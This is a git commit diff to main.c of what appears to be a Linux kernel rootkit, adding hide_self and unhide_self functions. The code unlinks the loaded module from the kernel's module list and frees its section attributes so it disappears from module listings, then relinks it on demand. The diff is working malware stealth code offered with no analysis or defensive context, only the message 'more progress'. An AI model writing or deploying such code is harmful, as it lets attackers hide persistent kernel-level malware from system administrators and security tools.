4949e150b8ad6f7ac8d77ae15c4e72e54e633a04
Sebastian Dumbrava <sebastianbdumbrava@gmail.com>
2021-10-23 08:58:45 -0700

    more progress

--- main.c
+++ main.c
@@ -8,13 +8,41 @@
 
 
 
-
+void hide_self(void);
+void unhide_self(void);
 
 
 int rk_init(void);
 void rk_exit(void);
 
 
+static struct list_head *prev_module;
+
+void hide_self(void)
+{
+	while (!mutex_trylock(&module_mutex))
+                cpu_relax();
+        prev_module = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+        kfree(THIS_MODULE->sect_attrs);
+        THIS_MODULE->sect_attrs = NULL;
+        mutex_unlock(&module_mutex);
+
+	return;
+}
+
+
+
+
+void unhide_self(void)
+{
+        while (!mutex_trylock(&module_mutex))
+                cpu_relax();
+        list_add(&THIS_MODULE->list, prev_module);
+        mutex_unlock(&module_mutex);
+
+	return;
+}
 int rk_init(void)
 {
 
